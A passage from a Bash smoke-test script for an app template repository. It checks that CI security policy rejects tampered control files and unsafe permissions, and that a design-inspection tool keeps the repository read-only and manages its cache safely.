    "$copy" \
    "scripts/security-boundary.sha256: controller path set is incomplete or unordered"
  rm "$copy/.mcp.json"

  printf '<plist version="1.0"><dict/></plist>\n' \
    >"$copy/ExportOptions.plist"
  expect_ci_rejection \
    "$copy" \
    "scripts/security-boundary.sha256: controller path set is incomplete or unordered"
  rm "$copy/ExportOptions.plist"

  printf '<plist version="1.0"><dict/></plist>\n' \
    >"$copy/App/Additional.entitlements"
  expect_ci_rejection \
    "$copy" \
    "scripts/security-boundary.sha256: controller path set is incomplete or unordered"
  rm "$copy/App/Additional.entitlements"

  ln -s "$codex_config" "$copy/.codex/config-link.toml"
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted a symlinked Codex control file" >&2
    return 1
  fi
  rm "$copy/.codex/config-link.toml"

  ln "$codex_config" "$copy/.codex/config-hardlink.toml"
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted multiply linked Codex control metadata" >&2
    return 1
  fi
  rm "$copy/.codex/config-hardlink.toml"

  chmod g+w "$codex_config"
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted group-writable Codex control metadata" >&2
    return 1
  fi
  chmod g-w "$codex_config"

  chmod g+w "$copy/.xcodebuildmcp"
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted a group-writable MCP control directory" >&2
    return 1
  fi
  chmod g-w "$copy/.xcodebuildmcp"

  chmod g+w "$copy"
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted a group-writable repository root" >&2
    return 1
  fi
  chmod g-w "$copy"

  printf '\n#if SNAPSHOT_RENDER_ONLY\n#endif\n' >>"$mode_source"
  if "$copy/scripts/check-ci-security.sh" >/dev/null 2>&1; then
    echo "CI policy accepted render-only behavior in product code" >&2
    return 1
  fi
}

test_factory_design_entrypoint_is_repository_read_only() {
  local cache cache_count cache_key checkout_mode copy digest expected_lock expected_scratch first_output first_pid fixture_package_root held_generation held_marker held_release holder_pid manifest marker output payload prune_pid_one prune_pid_two prune_stderr_one prune_stderr_two second_output second_pid source status toolchain_identity unsafe_cache
  copy="$(fixture factory-design-read-only)"
  source="$copy/docs/design/hero/source.png"
  /bin/mkdir -p "${source%/*}"
  /usr/bin/printf '%s' 'owner-source-image' >"$source"
  digest="$(/usr/bin/shasum -a 256 "$source" | /usr/bin/awk '{print $1}')"
  git -C "$copy" add docs/design/hero/source.png
  git -C "$copy" \
    -c user.name='Template Smoke' \
    -c user.email='template-smoke@example.invalid' \
    commit -qm 'add design source fixture'

  /bin/chmod -R a-w "$copy"
  held_release="$TMP_ROOT/factory-held-generation.release"
  trap "/usr/bin/touch '$held_release'; /bin/chmod -R u+w '$copy'" EXIT
  manifest="$(/usr/bin/jq -cS --arg digest "$digest" \
    '.fixtures[0].valid | .content_sha256 = $digest' \
    "$copy/.factory/evals/public/schemas/design-fixtures.json")"
  cache="$TMP_ROOT/factory-design-cache"
  first_output="$TMP_ROOT/factory-design-first.json"
  second_output="$TMP_ROOT/factory-design-second.json"
  /usr/bin/printf '%s' "$manifest" \
    | FACTORY_CLI_CACHE_ROOT="$cache" "$copy/scripts/factory" design inspect >"$first_output" &
  first_pid=$!
  /usr/bin/printf '%s' "$manifest" \
    | FACTORY_CLI_CACHE_ROOT="$cache" "$copy/scripts/factory" design inspect >"$second_output" &
  second_pid=$!
  wait "$first_pid"
  wait "$second_pid"
  output="$(<"$first_output")"
  /usr/bin/printf '%s' "$output" \
    | /usr/bin/jq -e --argjson expected "$manifest" '. == $expected' >/dev/null
  /usr/bin/jq -e --argjson expected "$manifest" '. == $expected' "$second_output" >/dev/null

  /usr/bin/python3 -I - "$cache" <<'PY'
import os
import pathlib
import sys

root = pathlib.Path(sys.argv[1])
for generation in range(4):
    directory = root / f"{generation:064x}"
    directory.mkdir(mode=0o700)
    lock = pathlib.Path(str(directory) + ".lock")
    lock.touch(mode=0o600)
    os.chmod(lock, 0o600)
PY
  /usr/bin/printf '%s' "$manifest" \
    | FACTORY_CLI_CACHE_ROOT="$cache" "$copy/scripts/factory" design inspect >/dev/null
  cache_count="$(/usr/bin/python3 -I -c \
    'import os,re,sys; print(sum(1 for value in os.scandir(sys.argv[1]) if value.is_dir(follow_symlinks=False) and re.fullmatch(r"[0-9a-f]{64}", value.name)))' \
    "$cache")"
  [[ "$cache_count" -le 3 ]] || return 1

  held_generation="$cache/ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
  held_marker="$TMP_ROOT/factory-held-generation.locked"
  /bin/mkdir -m 700 "$held_generation"
  /usr/bin/touch "$held_generation.lock"
  /bin/chmod 600 "$held_generation.lock"
  /usr/bin/touch -t 200001010000 "$held_generation"
  /usr/bin/lockf -k "$held_generation.lock" /bin/sh -c \
    'touch "$1"; while [ ! -e "$2" ]; do sleep 0.1; done' \
    sh "$held_marker" "$held_release" &
  holder_pid=$!
  for _ in {1..50}; do
    [[ ! -e "$held_marker" ]] || break
    /bin/sleep 0.1
  done
  [[ -e "$held_marker" ]] || return 1
  /usr/bin/printf '%s' "$manifest" \
    | FACTORY_CLI_CACHE_ROOT="$cache" "$copy/scripts/factory" design inspect >/dev/null
  [[ -d "$held_generation" ]] || return 1
  /usr/bin/touch "$held_release"
  wait "$holder_pid"
  cache="$(cd "$cache" && /bin/pwd -P)"
  toolchain_identity="$(/usr/bin/xcrun swift --version 2>&1)"
  fixture_package_root="$(cd "$copy/Packages/Factory" && /bin/pwd -P)"
  cache_key="$(/usr/bin/printf '%s\0%s' "$fixture_package_root" "$toolchain_identity" \
    | /usr/bin/shasum -a 256 | /usr/bin/awk '{print $1}')"
  expected_scratch="$cache/$cache_key"
  expected_lock="$expected_scratch.lock"
  [[ -d "$expected_scratch" && -f "$expected_lock" ]] || return 1
  set +e
  FACTORY_CLI_CACHE_ROOT="$cache" \
    FACTORY_EXPECTED_CLI_LOCK="$expected_lock" \
    FACTORY_EXPECTED_CLI_SCRATCH="$expected_scratch" \
    FACTORY_EXPECTED_CLI_LOCK_IDENTITY=0:0 \
    FACTORY_LIBRARY_ONLY=1 /bin/bash -p -c 'source "$1"; prepare_cli locked' \
    factory-generation-drift "$copy/scripts/factory" >/dev/null 2>&1
  status=$?
  set -e
  [[ "$status" -eq 73 ]] || return 1
  /usr/bin/python3 -I - "$cache" <<'PY'
import os
import pathlib
import sys

root = pathlib.Path(sys.argv[1])
for generation in range(16, 24):
    directory = root / f"{generation:064x}"
    directory.mkdir(mode=0o700, exist_ok=True)
    lock = pathlib.Path(str(directory) + ".lock")
    lock.touch(mode=0o600, exist_ok=True)
    os.chmod(lock, 0o600)
PY
  prune_stderr_one="$TMP_ROOT/factory-pruner-one.stderr"
  prune_stderr_two="$TMP_ROOT/factory-pruner-two.stderr"
  FACTORY_LIBRARY_ONLY=1 /bin/bash -p -c \
    'source "$1"; CLI_SCRATCH="$2/current"; prune_cache_generations "$2"' \
    factory-concurrent-pruner-one "$copy/scripts/factory" "$cache" 2>"$prune_stderr_one" &
  prune_pid_one=$!
  FACTORY_LIBRARY_ONLY=1 /bin/bash -p -c \
    'source "$1"; CLI_SCRATCH="$2/current"; prune_cache_generations "$2"' \
    factory-concurrent-pruner-two "$copy/scripts/factory" "$cache" 2>"$prune_stderr_two" &
  prune_pid_two=$!
  wait "$prune_pid_one"
  wait "$prune_pid_two"
  [[ ! -s "$prune_stderr_one" && ! -s "$prune_stderr_two" ]] || return 1
  cache_count="$(/usr/bin/python3 -I -c \
    'import os,re,sys; print(sum(1 for value in os.scandir(sys.argv[1]) if value.is_dir(follow_symlinks=False) and re.fullmatch(r"[0-9a-f]{64}", value.name)))' \
    "$cache")"
  [[ "$cache_count" -le 3 ]] || return 1
  [[ ! -e "$copy/Packages/Factory/.build" ]] || return 1
  [[ ! -e "$copy/Packages/Factory/.swiftpm" ]] || return 1
  [[ -z "$(git -C "$copy" status --porcelain --untracked-files=all)" ]] || return 1

  payload="$TMP_ROOT/factory-arbitrary-payload"
  marker="$TMP_ROOT/factory-arbitrary-payload-ran"
  /usr/bin/printf '%s\n' '#!/bin/sh' 'touch "$1"' >"$payload"
  /bin/chmod 700 "$payload"
  set +e
  FACTORY_CLI_CACHE_ROOT="$cache" "$copy/scripts/factory" \
    __run-cached-cli "$TMP_ROOT" "$payload" "$marker" >/dev/null 2>&1
  status=$?
  set -e
  [[ "$status" -ne 0 && ! -e "$marker" ]] || return 1

  /bin/rm -rf "$cache"
  [[ ! -e "$cache" ]] || return 1

  unsafe_cache="$TMP_ROOT/factory-design-unsafe-cache"
  /bin/mkdir -m 700 "$unsafe_cache"
  /bin/chmod +a 'everyone allow write' "$unsafe_cache"
  set +e
  FACTORY_CLI_CACHE_ROOT="$unsafe_cache" "$copy/scripts/factory" client profiles >/dev/null 2>&1
  status=$?
  set -e
  [[ "$status" -eq 73 ]] || return 1
  /bin/chmod -N "$unsafe_cache"
  /bin/rm -rf "$unsafe_cache"

  checkout_mode="$(/usr/bin/stat -f '%Lp' "$copy")"
  set +e
  FACTORY_CLI_CACHE_ROOT="$copy/cache" "$copy/scripts/factory" client profiles >/dev/null 2>&1
  status=$?
  set -e
  [[ "$status" -eq 73 && ! -e "$copy/cache" ]] || return 1
  [[ "$(/usr/bin/stat -f '%Lp' "$copy")" == "$checkout_mode" ]] || return 1
  [[ -z "$(git -C "$copy" status --porcelain --untracked-files=all)" ]] || return 1
  /bin/chmod -R u+w "$copy"
  trap - EXIT
}

run_test "shell assertions propagate failures" test_shell_assertions_are_explicit
run_test "rename is target-aware and escaped" test_rename_is_target_aware_and_escaped
run_test "feature linking survives sample removal" test_feature_linking_without_sample_anchor
run_test "feature preflight failure is inert" test_feature_preflight_failure_is_inert
run_test "preview review requires fresh exports" test_preview_review_rejects_missing_fresh_export
run_test "snapshot and record filters share one contract" test_snapshot_filter_contract
run_test "hosted snapshot renders never claim pixel baselines" test_snapshot_render_only_contract
run_test "snapshot diffs install only exact reviewed bytes" test_snapshot_diff_review_contract
run_test "snapshot locks recover stale owners only" test_snapshot_lock_contract
run_test "snapshot commands have a watchdog" test_snapshot_timeout_contract
run_test "PID selection fails on ambiguity" test_pid_ambiguity_contract
run_test "failed launches terminate their detached process" test_failed_launch_terminates_detached_process
run_test "failed-launch cleanup revalidates exact process identity" test_failed_launch_cleanup_revalidates_process_identity
run_test "evaluator shells isolate before Bash starts" test_evaluator_shell_starts_from_clean_environment
run_test "same-tree commits invalidate build provenance" test_commit_invalidates_build_provenance
run_test "XcodeBuildMCP installs from a clean reviewed lock" test_xcodebuildmcp_clean_install
run_test "XcodeBuildMCP termination cleans an active install" test_xcodebuildmcp_install_signal_cleanup
run_test "XcodeBuildMCP crash recovery preserves and reaps live installs" test_xcodebuildmcp_kill_recovery
run_test "XcodeBuildMCP crash recovery leases live runtimes" test_xcodebuildmcp_runtime_kill_recovery
run_test "artifact retention excludes ambient secrets" test_artifact_secret_boundary
run_test "brownfield adoption rejects escape symlinks" test_adopt_rejects_escape_symlinks
run_test "brownfield adoption without origin preserves source" test_adopt_without_origin_preserves_source
run_test "capture commands require explicit approval" "$ROOT/scripts/check-capture-policy.sh"
run_test "factory contract rejects seeded corruption" "$ROOT/scripts/test-factory-contract.sh"
run_test "factory design entrypoint is repository-read-only" test_factory_design_entrypoint_is_repository_read_only
run_test "Factory API freeze rejects package authority wrappers" test_factory_api_rejects_package_wrapper
run_test "dependency control plane rejects executable and config drift" test_dependency_control_plane_rejects_mutations
run_test "CI authority and dependencies are pinned" "$ROOT/scripts/check-ci-security.sh"
run_test "CI policy rejects YAML bypass forms" test_ci_policy_rejects_yaml_bypasses

if [[ "$FAILURES" -ne 0 ]]; then
  echo "template smoke: $FAILURES test(s) failed" >&2
  exit 1
fi

echo "template smoke: OK"
